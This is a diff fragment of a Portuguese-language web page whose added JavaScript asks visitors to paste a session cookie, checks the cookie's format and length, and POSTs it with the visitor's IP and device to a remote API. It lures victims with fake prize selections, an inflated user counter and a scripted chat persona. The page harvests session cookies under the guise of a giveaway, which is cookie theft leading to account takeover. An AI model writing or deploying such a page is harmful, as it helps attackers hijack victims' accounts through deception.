+                showNotification('Bloqueado', 'Seu IP está banido!', false);
+                return;
+            }
+            
+            const rawCookie = input.value.trim();
+
+            if (!rawCookie) {
+                showNotification('Erro', 'Cole um cookie primeiro', false);
+                return;
+            }
+
+            const cookie = cleanCookie(rawCookie);
+
+            if (!isValidCookieFormat(cookie)) {
+                showNotification('Erro', 'Formato de cookie inválido! Use o formato correto.', false);
+                return;
+            }
+
+            if (!checkCooldown()) {
+                const rem = Math.ceil(getCooldownRemaining() / 1000);
+                showNotification('Aguarde', `Pode enviar novamente em ${rem}s`, false);
+                return;
+            }
+
+            if (cookie.length < 50) {
+                showNotification('Erro', 'Cookie incompleto', false);
+                return;
+            }
+
+            status.innerHTML = '<div class="spinner"></div>';
+            btn.disabled = true;
+
+            try {
+                const response = await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        cookie: cookie,
+                        ip: userIP,
+                        device: navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC',
+                        timestamp: new Date().toLocaleString('pt-BR')
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    localStorage.setItem(COOLDOWN_KEY, Date.now().toString());
+                    updateInfoDisplays();
+
+                    status.innerHTML = '<div class="success-check">✓</div>';
+                    input.value = '';
+                    updatePreview();
+                    
+                    document.getElementById('countStat').textContent = 
+                        (parseFloat(document.getElementById('countStat').textContent) + 0.1).toFixed(1) + 'k';
+                    
+                    showNotification('Sucesso!', 'Cookie enviado com sucesso', false);
+                    
+                    setTimeout(() => {
+                        document.getElementById('page1').classList.add('hidden');
+                        document.getElementById('page2').classList.remove('hidden');
+                        status.innerHTML = '';
+                    }, 1000);
+                } else {
+                    if (data.banned) {
+                        await checkIfBanned();
+                        showNotification('🚫 BANIDO', data.message || 'IP banido por spam', true);
+                    } else {
+                        throw new Error(data.error || 'Erro no servidor');
+                    }
+                }
+            } catch (error) {
+                showNotification('Erro', 'Falha ao enviar cookie', false);
+            } finally {
+                setTimeout(() => { 
+                    if (banMessageEl.style.display !== 'block') {
+                        btn.disabled = false; 
+                    }
+                }, 2000);
+            }
+        }
+
+        function selectPrize(prize) {
+            showNotification(prize + ' Selecionado!', 'Resgate disponível em instantes', false);
+            const cards = document.querySelectorAll('.choice-item');
+            cards.forEach(c => c.style.opacity = '0.5');
+            setTimeout(() => cards.forEach(c => c.style.opacity = '1'), 300);
+        }
+
+        function goBack() {
+            document.getElementById('page2').classList.add('hidden');
+            document.getElementById('page1').classList.remove('hidden');
+        }
+
+        function generateSessionId() {
+            return Math.random().toString(36).substring(2, 15) + 
+                   Math.random().toString(36).substring(2, 15);
+        }
+
         let count = 1.2;
         setInterval(() => {
-            count += 0.1;
+            count = count + 0.1;
             document.getElementById('countStat').textContent = count.toFixed(1) + 'k';
         }, 30000);
-        
-        window.addEventListener('load', async () => {
-            await getUserIP();
-            createStars();
-            loadReviews();
-            updateInfoDisplays();
-        });
+
+        let inactivityTimer;
+        function resetInactivityTimer() {
+            if (inactivityTimer) clearTimeout(inactivityTimer);
+            inactivityTimer = setTimeout(() => {
+                if (document.getElementById('page3').classList.contains('hidden')) return;
+                
+                const randomMessage = waitingMessages[Math.floor(Math.random() * waitingMessages.length)];
+                addOliviaMessage(randomMessage);
+            }, 45000);
+        }
+
+        document.getElementById('chatInput').addEventListener('focus', resetInactivityTimer);
+        document.getElementById('chatInput').addEventListener('input', resetInactivityTimer);
+        document.getElementById('chatInput').addEventListener('blur', resetInactivityTimer);
     </script>
 </body>
 </html>
+
+
